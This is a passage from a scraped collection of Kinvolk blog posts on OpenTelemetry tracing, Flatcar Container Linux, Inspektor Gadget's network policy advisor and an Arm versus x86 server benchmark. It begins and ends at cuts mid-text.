recommendable to first open an issue about it and discuss it in its Github project before writing the code (especially if it is a complex feature). The Kinvolk team hopes you enjoy its new product. We’d love to hear your thoughts and feedback - via email ( [email protected] ), or Twitter (@kinvolkio).", "date": "2019-11-07"},
{"website": "Kinvolk", "title": "A Shallow Dive Into Distributed Tracing", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Andrew Randall\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2019/09/a-shallow-dive-into-distributed-tracing/", "abstract": "We at Kinvolk were excited to begin working recently with the amazing team over at LightStep on distributed tracing. I must admit that, while I was aware of the OpenTracing project and knew it was probably kind of important, I did not know a whole lot about the topic when we first started chatting about it at KubeCon in Barcelona. Since then, through our engagement with LightStep, I’ve learned a little bit about the topic and I’d love to share some of those learnings. Important note: I am a complete novice learning about the topic for the first time. I do not claim to be an expert in this field — hence why I’m calling this a “shallow dive”. I look forward to learning from all the smart people who I hope will point out what I’ve got wrong or oversimplified! Observability The first thing I learned diving into this space is that there is a broad concept of “observability”, which is traditionally viewed as a combination of three things (which are often conflated or misunderstood): Logs Metrics Tracing. Logs are pretty well understood - applications have been emitting logs for many years, with varying levels of structure, and tools like fluentd provide means of processing them in large volume. Metrics - quantified measures of application performance over time - are super useful because they provide easily understandable and immediately actionable data. Projects such as Prometheus have emerged to track metrics at scale. Tracing is perhaps the most powerful element of observability, and what we are going to dive into with the rest of this blog post. I should mention there’s an open question about whether you should capture absolutely every data point coming from your system (see: LightStep’s Satellite Architecture) , or whether it’s better to sample (e.g. capture one of every 100 metrics). That seems to be an ideological debate that I am not sufficiently expert to weigh in on, but it would appear there are good people on both sides. In any case, the popular tracing libraries all support optional sampling so you can decide what is best for your application. Distributed Tracing With the advent of microservices, a single request can lead to dozens or hundreds of separate API calls over network interfaces. While each of the microservices involved may be writing its own logs, making sense of the end-to-end chain that represents the processing related to a single request requires correlating and sequencing event logs (and potentially related metrics) across all the microservices involved. How it Works One of the barriers to understanding distributed tracing (like any specialist field) is that it has its own terminology. A good place to start is the fundamental concept of the span . A span is a named, timed operation representing a chunk of the workflow. Spans can reference other spans in a hierarchical manner (i.e. parent/child). A root span has no parent, and might be (for example) a web request for a particular page. Child spans might be specific pieces of work that are performed to render that page. These references generally represent causal information, i.e. this span was triggered by work performed in this other span. OpenTelemetry goes even further, allowing more complex link relationships between spans (e.g. multiple parents). A group of spans referencing each other together make up a trace . This example from the OpenCensus documentation might help to visualize these relationships: In this example, a request is made to the /messages URL, which first triggers a user authorization step, a cache query and then (because there is a cache miss), a database lookup and populating the cache with the results. The auth , cache.Get , mysql.Query and cache.Put spans are all child spans of the /messages span, and all the spans together comprise a single trace. In a distributed system, a span typically encompasses more than one microservice. To enable this to work, a span context object is passed along with the regular in-process or RPC function calls, including all the information the tracing system needs to associate events with the current span. One thing that might be obvious, but which I found quite cool, is that a span can be server or client side, enabling a distributed tracing system to present a coherent view from the front-end code running in a browser to the back-end server fulfilling the client request. Another thing I really liked is that spans have tags (each a key/value pair), which allow for selector operations just like you would be used to with Kubernetes objects. Manual vs Automated Instrumentation So we’ve established that traces comprise spans, which are created in a context which is shared around a distributed system. But how does the tracing system know when a span is created, and how is the context shared across function calls (local in-process, or remote across the network)? The basic approach is for the programmer to add a few simple API calls to their code. For example, this would start a root span: func xyz () { ... sp := opentracing. StartSpan ( \"operation_name\" ) defer sp. Finish () ... } And this would create a child span of an existing span: func xyz (parentSpan opentracing.Span, ... ) { ... sp := opentracing. StartSpan ( \"operation_name\" ,\n            opentracing. ChildOf (parentSpan. Context ())) defer sp. Finish () ... } If the span context needs to be serialized on the wire, this can be done like this: func makeSomeRequest (ctx context.Context) ... { if span := opentracing. SpanFromContext (ctx); span != nil {\n            httpClient := & http.Client{}\n            httpReq, _ := http. NewRequest ( \"GET\" , \"http://myservice/\" , nil ) // Transmit the span's TraceContext as HTTP headers on our // outbound request. opentracing. GlobalTracer (). Inject (\n                span. Context (),\n                opentracing.HTTPHeaders,\n                opentracing. HTTPHeadersCarrier (httpReq.Header))\n\n            resp, err := httpClient. Do (httpReq) ... } ... } And so on. As you can see, adding tracing in this way is straightforward, but it is not automatic. The “holy grail” of tracing is that is should be possible to add it to any program without requiring any work on the part of the programmer. In practice, how achievable that goal is depends on the language and libraries that are used. The OpenTracing Registry is a good way to see if a specific library already has helpers for instrumentation. Some commercial solutions offer this kind of capability, and OpenTracing has an implementation of automated tracing for Java with its Special Agent . OpenTracing? OpenCensus? No, OpenTelemetry! This brings us onto the topic of implementations of distributed tracing. Modern distributed tracing can trace (pun intended, sorry) its roots back to a Google white paper on its internal system, known as Dapper (co-created by Ben Sigelman , who went on to found LightStep). This introduced terms such as span and trace context for the first time, and inspired the open source project OpenTracing which defined an API that could be implemented by multiple plug-in “tracers”. OpenTracing was adopted by the Cloud Native Computing Foundation, the home of Kubernetes and many other related projects, and became widely adopted by projects such as Jaeger (also in the CNCF but originally by Uber), and commercial solutions such as DataDog and LightStep. In a parallel effort, Google evolved its internal distributed tracing and metrics solution with a project known as Census, which it open sourced early in 2018 as OpenCensus. Unlike OpenTracing which defined an API that could have multiple independent implementations, OpenCensus defined both the API and implementation. It also included support for metrics as well as tracing, so had more functionality. There were clearly pros and cons to each approach - OpenTracing enabled a vibrant ecosystem, whereas OpenCensus had a rich solution, proven in Google, that worked out of the box. OpenTracing and OpenCensus cannot be used together on the same system, leading to potential fragmentation of the tracing community. Fortunately, the community recognized this issue and the teams got together to agree to focus their efforts on a new project. OpenTelemetry would combine the best aspects of OpenTracing and OpenCensus in one definitive standard, backed by all the major players in the industry. We at Kinvolk are proud to be part of this important initiative, and grateful to LightStep for sponsoring and supporting our work in this area. The Road Ahead The immediate focus for our team working on OpenTelemetry is to help the community create a first release that meets the production needs of users _at least as well _as both OpenTracing and OpenCensus. The community has defined the ambitious goal of achieving this milestone in September 2019, with the OpenTracing and OpenCensus projects being retired by November. In short, the next few months are crucial for uniting the developer and user communities behind a single vision for the future of distributed tracing and metrics. Our involvement, working with LightStep and led by our CTO and co-founder Alban Crequy , is to develop various language implementations, starting with Go and Python but eventually expanding to every major language, and contributing to the special interest groups (SIGs) who are still defining the APIs. We are also starting to look at how we can add auto-instrumentation into OpenTelemetry, to make it as simple to adopt as possible, and enable the ultimate vision of zero touch, complete observability for all cloud native applications. This is exciting, technically challenging work that significantly advances the state of the art in open source — exactly the kind of project we at Kinvolk like to get involved in!", "date": "2019-09-13"},
{"website": "Kinvolk", "title": "Announcing the Kinvolk Flatcar Container Linux Subscription", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Andrew Randall\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2019/11/announcing-the-kinvolk-flatcar-container-linux-subscription/", "abstract": "Back in March last year, following Red Hat’s acquisition of CoreOS, Inc., we announced Flatcar Container Linux, a fork of CoreOS Container Linux. At the time, we saw this as a kind of insurance policy for a future when Red Hat might terminate ongoing support and maintenance of the widely-deployed CoreOS platform. As we put it at the time: The strongest open source projects have multiple commercial vendors that collaborate together in a mutually beneficial relationship. This increases the bus factor for a project. Container Linux has a bus factor of 1. The introduction of Flatcar Linux brings that to 2. Today we announced the general availability of the Kinvolk Flatcar Container Linux Subscription. The subscription includes: technical support including optional 24x7x365 response time service level agreement access to the Kinvolk customer portal for ticket management and knowledge base articles new software releases across four delivery channels: stable, beta, alpha and edge (experimental) regular security updates the new Kinvolk Update Service, available hosted or on-prem, for fine-grain control and visibility of Flatcar updates across an entire fleet of machines (for more about the Kinvolk Update Service and the technology behind it, check out this post by project lead Joaquim Rocha . We are particularly pleased at the broad welcome this announcement has received from both end users and our industry partners: “As we realized CoreOS Container Linux was reaching end of support, we reached out to the team at Kinvolk and were impressed by their commitment to the original CoreOS vision, and their ability to support us through a seamless transition to Flatcar. With a Flatcar Container Linux subscription in place, we now feel comfortable that we have a viable long-term platform strategy.” – Michael Ferraro, VP Platform at UpGuard “We believe Flatcar Container Linux will be welcomed by developers and administrators who rely on CoreOS today for its lightweight approach, built-in support of the Docker container engine, and as a proven platform for Docker Enterprise.” – Justin Graham, VP Product Management at Docker, Inc. “We’re longtime fans of CoreOS Container Linux, and it remains the most popular substrate for container environments in our bare metal cloud. With Flatcar Container Linux, the community now has a strong roadmap upon which to continue the momentum of CoreOS, backed by a proactive support model and the stellar Kinvolk team. We are inviting our CoreOS users to migrate to Flatcar Container Linux, which has been fully integrated into the Packet platform.” – Zac Smith, CEO at Packet, a leading bare metal cloud provider based in New York “At Container Solutions, we’re in the business of helping customers shift their businesses to modern software development and deployment practices. CoreOS Container Linux has been one of our customers' most popular options, so we are pleased to see Kinvolk taking the initiative to enable them to continue with the same software foundation on a commercially supported basis.” – Jamie Dobson, CEO at Container Solutions “CoreOS Container Linux has seen wide adoption across the industry, and many users are looking for a path forward that doesn’t entail significant operational disruption. Over the past 18 months, Kinvolk has demonstrated their commitment and ability to do this with Flatcar Container Linux, and I’m pleased to see they are now backing that up with commercial support and managed update service.” – Joe Sandoval, SRE Manager, Infrastructure Platform at Adobe, and OpenStack User Committee member “We are excited to be collaborating with Kinvolk to enable an upgrade path for our customers who are currently deploying Kubernetes with CoreOS, as well as supporting future Kubernetes adopters who need a secure operating system foundation.” – Matt Barker, CEO at Jetstack, a leading Kubernetes consultancy based in London, UK “At Giant Swarm, we strongly believe in the minimal and immutable container Linux approach, which is why we built our managed Kubernetes service on CoreOS (in part with the help of Kinvolk’s engineering team). Going forward, Flatcar Container Linux offers us an identical operational experience, with the commitment to long-term maintenance, support and security updates that we need to ensure a stable platform for our demanding enterprise customers such as Adidas and Vodafone.” – Timo Derstappen, chief technology officer, Giant Swarm “The market is looking for a container Linux distribution maintained by an independent, community-oriented team, and Kinvolk has the right pedigree to deliver it. We are excited to collaborate with them to help our Kubermatic Kubernetes Platform customers adopt Flatcar Container Linux.” – Sebastian Scheele, co-founder and CEO, Loodse The Kinvolk Flatcar Container Linux Subscription is available today, and is already being adopted by multiple large enterprise customers across thousands of container hosts. Pricing is per node (physical or virtual, without CPU limits). From now until March 31, 2020, Kinvolk will commit to matching the price of any existing CoreOS Container Linux support contract, and will beat it by at least 10% for the first year’s subscription. Download the Flatcar Container Linux datasheet for details, or get in touch to find out more.", "date": "2019-11-07"},
{"website": "Kinvolk", "title": "Flatcar Container Linux enters new era after CoreOS End-of-Life announcement", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Chris Kuehl\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2020/02/flatcar-container-linux-enters-new-era-after-coreos-end-of-life-announcement/", "abstract": "Almost two years ago, we launched Flatcar Container Linux , a drop-in replacement for CoreOS Container Linux. Since then, we’ve made almost 200 releases , added an experimental edge channel , released the update server - Nebraska , (re-)introduced ARM support (which had been dropped by Red Hat), and introduced the Kinvolk Flatcar Container Linux Subscription . But Flatcar Container Linux is about to enter a new era. The New Era Earlier this month, Red Hat announced the End of Life of CoreOS Container Linux will be May 26th. This was something that had been expected since soon after the CoreOS acquisition was announced; everyone knew it was coming, but now we have dates. For Flatcar Container Linux, this means the Kinvolk team will be continuing maintenance and development completely independent of upstream CoreOS. This is something for which we’ve been anticipating and preparing for some time. We have formed a strong OS and Security team, led by Thilo Fromm , previously technical project manager responsible for AWS’s internal Linux efforts. That team is already building and testing the edge and alpha channels with updated packages and kernels compared with upstream CoreOS. Those updates will flow into the other channels following the usual alpha → beta → stable progression. For users, a potentially more impactful date is September 1st, after which “published resources related to CoreOS Container Linux will be deleted or made read-only. OS downloads will be removed, CoreUpdate servers will be shut down, and OS images will be removed from AWS, Azure, and Google Compute Engine”. This means that not only is Flatcar Container Linux the only way for current users of CoreOS Container Linux to go forward with active maintenance and security updates, but they will absolutely have to make that switch before September. The good news is that the migration to Flatcar is seamless. As many users — like the folks at Mettle — have already found out , the process can potentially amount to a simple one-line change. Committed to the vision We commit to staying true to the original purpose of CoreOS Container Linux; provide a minimal and secure container OS with automated, atomic updates, available across all platforms, and supported for years to come. We believe, as CoreOS did, that providing a minimal surface area for attack and running the newest stable software are key aspects of systems security. Flatcar Roadmap While Red Hat has continued basic maintenance of CoreOS Container Linux, the reality is that, in terms of new features, the project has stagnated since the acquisition was announced. With its end of life now imminent, it’s now time to start looking forward. We recently published our high-level plan for the next year. Some highlights on the way are Stable ARM support (already in alpha), Wider platform support, cgroupv2 (hybrid-mode) as default, Increased test coverage to guarantee stability etc. In addition, we will also be deprecating legacy components such as the kubelet-wrapper and rkt. A Linux Company At Kinvolk, much of our work nowadays revolves around Kubernetes, and we expect that to continue for the foreseeable future. But we see ourselves first and foremost as a Linux company . For us, the operating system is not a black-box. We believe the only way to understand a system is to understand all parts of it, including down and into the OS. We’ve built our team with this mindset. The Kinvolk team is composed of people who feel as comfortable doing Linux kernel or systemd development as they do when deploying a properly configured Kubernetes cluster. In fact, these are often skills found in single individuals. An Open Source Company Kinvolk is uncompromising in its dedication to making all our products fully open source. We believe that a fully open source enterprise stack is the ideal state for everyone. Our mission is to work towards that goal. In the context of Flatcar Container Linux, we’ve already demonstrated this philosophy by providing a fully open source update server, Nebraska . This was one of the few parts of the system that CoreOS had never made available under an OSS license. Gratitude We are greatly in debt to the CoreOS team. Kinvolk as a company is not only indebted to CoreOS for giving the world the Container Linux concept: Perhaps less well known, our founding project was working with CoreOS to develop rkt , the first alternative to the Docker container runtime, which led to the creation of the Open Container Initiative . This first project played a major role not just in the industry, but also in establishing Kinvolk’s reputation as a leader in Linux and container technologies. It would not be an exaggeration to say that Kinvolk exists today because of the confidence CoreOS put in our team, and that is something for which we will always be grateful. We are also grateful to the many folks within Red Hat and the community of CoreOS users and former employees who have been so supportive of our efforts with Flatcar, as well as our enterprise customers who enable us to fund those efforts. This has been truly something special, and gives us the faith that we can not just sustain but grow the community around Container Linux. A base upon which we build To conclude, we feel like we are in a unique position to continue the CoreOS legacy; a heavy burden we know. Flatcar Container Linux is the first phase of our plans. It provides the ideal base upon which, similar to CoreOS, we can apply our understanding of the Linux kernel and user space to make better systems.", "date": "2020-02-24"},
{"website": "Kinvolk", "title": "Writing Kubernetes network policies with Inspektor Gadget’s Network Policy Advisor", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Alban Crequy\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2020/03/writing-kubernetes-network-policies-with-inspektor-gadgets-network-policy-advisor/", "abstract": "At KubeCon EU 2016 in London, I gave a first talk about using BPF and\nKubernetes together . I was\npresenting a proof of concept to introduce various degraded network scenarios\nin specific pods for testing the reliability of apps. There was not a lot of\nBPF + Kubernetes talks back then. In the meantime, Kinvolk has worked on\nvarious projects mixing Kubernetes and BPF together. The latest such project is\nour own Inspektor Gadget , a\ncollection of “gadgets” for debugging and inspecting Kubernetes applications. Today I would like to introduce Inspektor Gadget’s newest gadget that helps to\nwrite proper Kubernetes network policies. Writing Kubernetes network policies easily Securing your Kubernetes clusters is a task that involves many aspects:\ncontrolling what goes into your container images, writing RBAC rules for\ndifferent users and services, etc. Here I focus on one important aspect:\nnetwork policies. At Kinvolk we regularly do security assessments of Kubernetes in the form of\npenetration testing for customers. Sometimes, the application is Kubernetes\nnative and the network policies are developed at the same time as the\napplication. This is ideal because the development team has a clear idea of\nwhich pod is supposed to talk to which pod. But sometimes, a pre-Kubernetes\napplication is ported to Kubernetes and the developer tasked with writing the\nnetwork policies may not have a clear idea of the architecture. Architecture\ndocuments might be missing or incomplete. Adding pod security as an\nafterthought might not be ideal, but thankfully the Network Policy Advisor in\nInspektor Gadget can help us here. The Network Policy Advisor workflow A workflow we suggest that can improve things is to deploy the application in a\ndevelopment cluster and let Inspektor Gadget monitor and analyse the network\ntraffic so it can suggest network policies. The developer can then review the\noutput and add them in the project. We will use GoogleCloudPlatform’s microservices-demo application as an example.\nIts kubernetes-manifests.yaml contains various deployments and services but no network policies. After preparing a “demo” namespace, let’s ask Inspektor Gadget to monitor the\nnetwork traffic from this namespace: $ kubectl gadget network-policy monitor \\\n        --namespaces demo \\\n        --output ./networktrace.log While it’s running in the background, deploy the application in the demo\nnamespace from another terminal: $ wget -O network-policy-demo.yaml https://raw.githubusercontent.com/GoogleCloudPlatform/microservices-demo/ccff406cdcd3e043b432fe99b4038d1b4699c702/release/kubernetes-manifests.yaml\n$ kubectl apply -f network-policy-demo.yaml -n demo Once the demo is deployed and running correctly, we can see all the pods in the\ndemo namespace: $ kubectl get pod -n demo\nNAME                                     READY   STATUS    RESTARTS   AGE\nadservice-58c85c77d8-k5667               1/1     Running   0          44s\ncartservice-579bdd6865-2wcbk             0/1     Running   1          45s\ncheckoutservice-66d68cbdd-smp6w          1/1     Running   0          46s\ncurrencyservice-65dd85f486-62vld         1/1     Running   0          45s\nemailservice-84c98657cb-lqwfz            0/1     Running   2          46s\nfrontend-788f7bdc86-q56rw                0/1     Running   1          46s\nloadgenerator-7699dc7d4b-j6vq6           1/1     Running   1          45s\npaymentservice-5c54c9887b-prz7n          1/1     Running   0          45s\nproductcatalogservice-7df777f796-29lmz   1/1     Running   0          45s\nrecommendationservice-89547cff8-xf4mv    0/1     Running   1          46s\nredis-cart-5f59546cdd-6rq8f              0/1     Running   2          44s\nshippingservice-778db496dd-mhdk5         1/1     Running   0          45s At this point, the different pods will have communicated with each other. The\nnetworktrace.log file contains one line per TCP connection with enough details\nto be able to infer network policies later on. Let’s stop the network monitoring by Inspektor Gadget using Ctrl-C, and\ngenerate the Kubernetes network policies: $ kubectl gadget network-policy report \\\n        --input ./networktrace.log > network-policy.yaml Note: Here we are running Inspektor Gadget as a kubectl subcommand. You could\nalso run it as a stand-alone binary using inspektor-gadget instead. One of the network policies it creates is for the cartservice: Inspektor Gadget\nnoticed that it received connections from the frontend and initiated\nconnections to redis-cart. It displays the following suggestion accordingly: apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  creationTimestamp: null\n  name: cartservice-network\n  namespace: demo\nspec:\n  egress:\n  - ports:\n    - port: 6379\n      protocol: TCP\n    to:\n    - podSelector:\n        matchLabels:\n          app: redis-cart\n  ingress:\n  - from:\n    - podSelector:\n        matchLabels:\n          app: frontend\n    ports:\n    - port: 7070\n      protocol: TCP\n  podSelector:\n    matchLabels:\n      app: cartservice\n  policyTypes:\n  - Ingress\n  - Egress As you can see, it converted the set of connection tuples into a set of network\npolicies using usual Kubernetes label selectors instead of IP addresses. Of course, those automatically-produced network policies should not be used\nblindly: a developer should verify that the connections observed are\nlegitimate. The Network Policy Advisor gadget has some limitations too (see #39 ), but it’s a lot\neasier to review them and possibly make some small changes, rather than writing\nthem from scratch with a frustrating trial and error development cycle. This\nsaves precious development time and likely costs too. Conclusion Inspektor Gadget has useful features for developers of Kubernetes applications.\nAs an Open Source project, contributions are welcome. Join the discussions on\nthe #inspektor-gadget channel in the Kubernetes Slack or, if you want to know\nabout our services related to pentesting and security, reach us at [email protected] .", "date": "2020-03-18"},
{"website": "Kinvolk", "title": "Comparative Benchmark of Ampere eMAG, AMD EPYC, and Intel XEON for Cloud-Native Workloads", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Kai Lüke\n    \n    \n    /\n    \n    \n  \n    \n    \n      Thilo Fromm\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2019/11/comparative-benchmark-of-ampere-emag-amd-epyc-and-intel-xeon-for-cloud-native-workloads/", "abstract": "Motivation The Arm CPU architecture has a rich history – starting with home computers in the 1980s (as Acorn RISC Machines), then establishing itself in the 1990s as the dominant architecture for embedded devices, a role that continues today and into the foreseeable future thanks to smartphones. Cloud infrastructure based on the Arm CPU architecture, often seen as exotic only a decade ago, has become more and more generally available in recent years. As Arm server/instances offerings are becoming more and more ubiquitous in the public cloud, we at Kinvolk were keen to understand the drawbacks and benefits of those offerings for cloud-native applications. We assembled a set of system-level benchmark tests and added automation to execute those benchmarks aimed at gaining insight into the performance of fundamental platform features and functions. We then looked at one implementation in particular – the Ampere eMAG bare-metal servers offered by the Packet IaaS provider – to better understand how this platform compares to more traditional x86 architecture offerings powered by Intel and AMD CPUs. The tools we created are more general though – these benchmarks can easily be run on any Kubernetes cluster; even adding support for new architectures (MIPS, POWER, IA64, etc.) should be straightforward. It should be noted that Kinvolk has ongoing cooperation with both Ampere Computing and Packet, and used all infrastructure used in our benchmarking free of charge. Ampere Computing furthermore sponsored the development of the control plane automation used to issue benchmark runs, and to collect resulting data points, and to produce charts. We are releasing the automation for building container images (so the same benchmarks can be run on multiple architectures) as well as scripted automation to perform the below benchmarks to the Open Source community at: https://github.com/kinvolk/benchmark-containers Goals We had three goals going into this study: Provide an extendable benchmark framework that runs reproducible benchmarks and produces human-readable output (charts) for anyone to download and use. Identify a set of system-level tests that provide a thorough understanding of a system’s performance, provide build automation and cloud-native packaging for different CPU architectures. Execute the above benchmark suite on a representative set of servers for selected CPU types, and deliver a comprehensive comparison which also discusses cost of operation. Benchmark Targets We selected similar Ampere, AMD, and Intel servers as offered by Packet. We benchmarked the performance of Ampere Computing’s eMAG CPU, 32 cores @3GHz (w/ 3.3 GHz TURBO) AMD’s EPYC 7401P, w/ 24 cores/48 threads @2.2GHz (w/ 2.8 GHz TURBO) Intel’s XEON 5120 x2, w/ 28 cores/52 threads @2.2GHz (w/ 3.2 GHz TURBO) The server configuration details can be found on Packet’s website and will be summarized here again. Ampere eMAG AMD EPYC Intel XEON Packet Server Type c2.large.arm c2.medium.x86 m2.xlarge.x86 Cost per Hour 1$ 1$ 2$ SKU Lenovo ThinkSystem HR330A Dell PowerEdge r6415 Dell PowerEdge R640 Sockets 1 1 2 Cores 32 24 28 CPU threads 32 48 52 Hyperthreading no yes yes Clock Speed 3-3.3 GHz 2.2-2.8 GHz (max 3 GHz single core) 2.2-3.2 GHz RAM 128 GB DDR4 64 GB DDR4 ECC RAM 384 GB DDR4 ECC RAM Storage 480 GB SSD 2 × 120 GB SSD 2 × 480 GB SSD 2 × 120 GB SSD 3.8 TB NVMe 10G NIC Mellanox Technologies MT27710 Family [ConnectX-4 Lx] (two are present but only one is used) OS Flatcar Container Linux Alpha, v2234 Kernel 4.19 Docker 18.06 Kubernetes 1.15.3 Flatcar Container Linux Stable, v2079 and v2247 Kernel 4.19 Docker 18.06 Kubernetes 1.15.3 Flatcar Container Linux Stable, v2247 Kernel 4.19 Docker 18.06 Kubernetes 1.15.3 Container Build Tooling Alpine Linux 3.10 GCC 8.3 musl libc 1.1.22 The systems have comparable hardware generations but do not have the same socket, CPU thread, and core count nor have the same clock speed. There are even bigger differences in terms of how many circles instructions need and of course the big architectural difference between Arm and x86 which will be covered in the next section. The amount of RAM, and type of SSDs and NVMes will not play a role in our benchmarks but may have been factored into the price difference. Ampere’s eMAG system is a bit smaller than the others which may incur a disadvantage in some benchmarks. It also has not been optimized for floating point and vector operations but we will also benchmark them. Still we think that the comparison of these three systems is valid because it allows to focus on the architectural differences and the different pricing. Hardware Security The benchmarks are run with all hardware side-channel mitigations enabled (as in Linux 4.19) to address vulnerabilities such as Spectre and Meltdown. However, Intel’s XEON uses Hyperthreading (SMT) and unless Hyperthreading is turned off a whole class of side-channel vulnerabilities stays present such as L1TF (Foreshadow) and MDS (Zombieload). AMD’s SMT architecture separates the CPU threads on a core more than Intel does and is therefore not affected by many of these side-channel vulnerabilities (You can check this on your systems by running spectre-meltdown-checker and look for reports that mention “ SMT vulnerable ”). The recommendation for Intel is to turn off Hyperthreading when running untrusted code on the server. OpenBSD disabled SMT/Hyperthreading on all systems even by default since the ongoing and future research may affect AMD, too. We therefore will include benchmark results that do not utilize all CPU threads but only all cores. The additional benefit besides performance numbers with security in mind is that we can see if there is any benefit of Hyperthreading for a particular workload. Arm and x86 architecture Before we dive into discussing specific system/cluster metrics we’re interested in and the tools to deliver those metrics, let’s address the elephant in the room: When coming from an x86 world, going Arm implies supporting a significantly different CPU architecture. It’s not just the mnemonics that are all different – also, Arm CPU instructions use a 3-address (or 3-register) instruction set (mul r0, r1, r2 multiplies the values of R1 with R2, and stores the result in R0), while x86 is limited to 2 addresses (imul eax, ebx multiplies EAX by EBX, and stores the result in EAX). The way instructions and data are structured in memory is fundamentally different, too – Arm follows a Harvard architecture approach, where instructions and data are stored in separate memory “words”. X86 on the other hand implements a von Neumann architecture, mixing data and instructions at least at the macro-code level (the existence of separate L1 “data” and “instruction” caches hints at Intel using Harward architecture at the microcode level, and stores micro-ops in L1 caches). However, having spent significant time with cloud-native applications on both x86 and Arm – including working with our Flatcar Container Linux OS and Lokomotive Kubernetes distribution on both, not least during the course of developing our benchmarking automation for this report – demonstrated to us that on the cloud-native level, those differences disappear, abstracted away by Kubernetes’ runtime and container images for each architecture. In our experience, both technological effort and implicit business risk of creating or packaging cloud-native apps for either Arm or x86 had no significant difference. In summary, and factoring in our experience of operating cloud-native workloads on both CPU architectures, we feel that Arm has become a commodity, even though it’s sometimes not yet treated as such by developers and operators. Whether a specific cloud-native application runs on nodes that happen to be powered by an Arm CPU, nodes that are driven by x86, or a hybrid mix of those, is not a significant factor because of the level of abstraction provided. During our explorations we also looked at legacy (monolithic) applications being ported into a cloud native environment, and found that a similar pattern applies: new microservice infrastructure carefully added during the work of porting legacy apps to cloud-native environments simply do away with old paradigms of depending on a single CPU architecture, and cluster runtime abstraction makes previous differences disappear. Metrics, Benchmark Tools, and Test Set-Up In order to understand performance differences when running cloud-native applications on Arm, AMD, and Intel CPUs, we considered a range of metrics of system-level functions which provide the foundation of the runtime environment cloud-native applications perform in. We started with considering basic hardware properties like raw CPU calculation performance and memory I/O, network performance, to provide an overview of what to expect and where to take a closer look. We extended our investigations into more complex OS performance characteristics, like threading, scheduling, and lock performance, which make up the most fundamental runtime infrastructure for both the Kubernetes control plane as well as cloud-native workloads. Ultimately, and following observations made during lower level benchmarks, we focused on a number of cloud-native components that are used in the majority of cloud-native architectures – HTTP server and object store in particular. Specifically, we use the following benchmark tools to get hardware performance metrics: stress-ng and sysbench for CPU and memory I/O workloads iperf3 for network performance For generating OS-level metrics, we used: stress-ng for shared memory, locks, and threading performance sysbench for the OS’ virtual filesystem (VFS) layer performance In addition to the above hardware- and system-level benchmarks, we used the following cloud-native applications (which are modules with widespread use in existing cluster deployments): memcached as a multi-threaded key-value store redis as a single-threaded key-value store (launched with multiple, independent instances to saturate a whole node’s CPUs) nginx as a HTTP server We used Redis’ excellent memtier_benchmark tool for generating metrics on both key-value stores; ab , fortio , and wrk2 (which we have past experience with, from our service mesh benchmarking) are used to benchmark NGINX. The build automation for the tools discussed above is available as open source/free software from our Github repo , allowing for straightforward reproduction of the container images we used for benchmarking but you can also get the built images on quay.io . NOTE that the benchmark container images are based on Alpine Linux , which uses the musl C library instead of glibc . This allows us to rigorously optimize for size and speed. All code is compiled with GCC 8.3.0. Kubernetes Stack, Reproducibility and Extendability We provisioned the Kubernetes clusters that we used to run our benchmarks on with our Lokomotive Kubernetes distribution, and used Flatcar Container Linux as its underlying operating system. Both are fully open source and available to everybody to reproduce our benchmarks, and to extend our work by running their own. Instructions for the (largely automated) provisioning of test clusters are provided in our benchmark containers repository, as is our scripted automation for running the benchmarks. This also allows others to improve and to extend on our work. NOTE: The default QoS class for jobs in Kubernetes is BestEffort . The default CPU shares setting for BestEffort is too limiting to utilize the full hardware because the value is 2 instead of the default 1024. Therefore, we set the CPU request of the benchmark pods to 1 which results in the QoS class Burstable that has 1024 as CPU share value. Basic setup We benchmarked three server types. For each server type we provisioned a cluster where this server type is the worker node to run the benchmark pods. Networking setup We use Calico as Kubernetes network plugin. Calico gives each Pod, i.e., our benchmark container, a virtual IP from a IP-in-IP overlay network. Since this IP-in-IP encapsulation introduces an overhead our cloud-native benchmark diverges from a hardware-oriented benchmark because instead of measuring node-to-node network performance we look at pod-to-pod network performance. For network benchmarks a second worker node is needed. We decided to measure the network performance as observed from a fixed client system. The final benchmark architecture for network performance can be seen in the following diagram. Multiple Data Points and Statistical Robustness As we are using the datacenters of a public cloud provider – Packet – to run our benchmarks, we have no control over which specific servers are picked for individual provisionings. The age of the machine and its respective components (memory, CPU, etc), and for network testing, its position in the datacenter relative to the other cluster nodes (same rack? same room? same fire zone?), and the state of the physical connections between the nodes all have an impact on the raw data any individual test run would produce. The activity of other servers that are completely unrelated to our test, but present in the same datacenter, and sharing the same physical network resources, might have a derogatory effect on iperf and nginx in particular, leading to dirty benchmark data. To counter, we apply sufficient statistical spread with multiple samples per data point to eliminate volatile effects of outside operations as well as aging/wear effects of hardware that make up our test nodes. We furthermore use multiple clusters in different datacenters with implicitly different placement layouts to also help drawing absolute conclusions from our data. In order to achieve sufficient statistical spread we execute individual benchmark runs multiple times to derive average, minima, and maxima. Using multiple clusters of identical setup also ensures our capacity does not include a “lemon” server (degraded hardware) or a bad switch, and to detect outliers like nodes placed at remote corners in the datacenter impacting network tests. Overall we ran benchmark tests in 2 regions in parallel, repeating each benchmark in 15 iterations. For each of the CPUs in each chart presented, we calculated the mean of the data points, and provided min-max bars to display the variance. Benchmark runs and observations In this section, we discuss the results achieved by Ampere’s eMAG, AMD’s EPYC, and Intel’s XEON. Apart from looking at raw benchmark results, we also consider cost of operation – in this case cost of benchmarking – based on the hourly rates offered by Packet. This implies the assumption of Packet pricing server types at rates that reflect their cost of acquisition and operation: Ampere’s eMAG is priced at 1$/h; cost-operation values will have a scaling factor of 1 AMD’s EPYC is also priced at 1$/h; cost-operation values will have a scaling factor of 1 Intel’s XEON is priced at 2$/h; cost-operation values will have a scaling factor of 0.5 All benchmarks run in 3 configurations: Multi-threaded with thread count equal to the number of CPU threads in the system. For Ampere Computing’s eMAG this does not change anything as the CPU does not implement hyperthreading. Multi-threaded with thread count equal to the number of physical cores in the system. This is a good reference point for x86 systems required to turn 